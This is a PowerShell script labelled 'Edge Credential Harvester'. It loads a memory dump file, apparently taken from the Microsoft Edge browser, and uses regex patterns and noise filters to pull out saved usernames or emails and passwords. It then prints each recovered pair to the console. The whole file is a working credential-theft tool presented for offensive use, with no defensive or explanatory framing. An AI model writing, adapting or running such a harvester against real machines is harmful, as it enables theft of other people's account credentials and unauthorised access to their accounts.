$file = "edge_snapped.dmp"

Write-Host "`nEdge Credential Harvester" -ForegroundColor White
Write-Host "---------------------------" -ForegroundColor White

if (Test-Path $file) {
    $fileInfo = Get-Item $file
    
    try {
        Write-Host "[*] Step 1: Mapping and Normalizing Memory..." -ForegroundColor White
        $rawBytes = [System.IO.File]::ReadAllBytes($fileInfo.FullName)
        $content = [System.Text.Encoding]::ASCII.GetString($rawBytes).Replace("`0", " ")
        $rawBytes = $null
        
        Write-Host "[*] Step 2: Running surgical pattern analysis..." -ForegroundColor White
        $pattern = "(\.com|\.net|\.org|\.fr|\.lol|\.ok|\.social|\.app|\.io|\.me|\.gov)https\s+(\S{3,50})\s+(\S{3,100})"
        $matches = [regex]::Matches($content, $pattern)
        Write-Host "[+] Step 2 Complete: Found $($matches.Count) potential matches." -ForegroundColor Green
        
        Write-Host "`n[#] EXTRACTION RESULTS [#]" -ForegroundColor White
        $finalSet = @{}

        foreach ($m in $matches) {
            $user = $m.Groups[2].Value.Trim()
            $pass = $m.Groups[3].Value.Trim()
            
            if ($user -match '[^\x20-\x7E]' -or $pass -match '[^\x20-\x7E]') { continue }
            
            $noise = "favicon|search|bing|google|yahoo|microsoft|msn|adobe|protocol|service|Signals|icon|origin|group|scheme|URIDetect|Signin|Deserializing|navigating|mode|Clearing|Successfully|timedout"
            if ($user -match $noise) { continue }

            if ($pass -match "http|202[0-9]|\\|/|:|%|cookie|Blocklisted|default|auth|created|elapsed|entry|scope" -or $user.Length -le 3) {
                continue
            }

            $key = "$user|$pass"
            if (-not $finalSet.ContainsKey($key)) {
                $finalSet[$key] = $true
                Write-Host "------------------------------------------"
                Write-Host "Username/eMail:   " -NoNewline
                Write-Host $user -ForegroundColor Red
                
                Write-Host "Password:         " -NoNewline
                Write-Host $pass -ForegroundColor Red
            }
        }
        Write-Host "------------------------------------------"

    } catch {
        Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "[-] Critical Error: File '$file' not found." -ForegroundColor Red
}

Write-Host "`n[*] Scan Complete. All tasks finished.`n" -ForegroundColor White
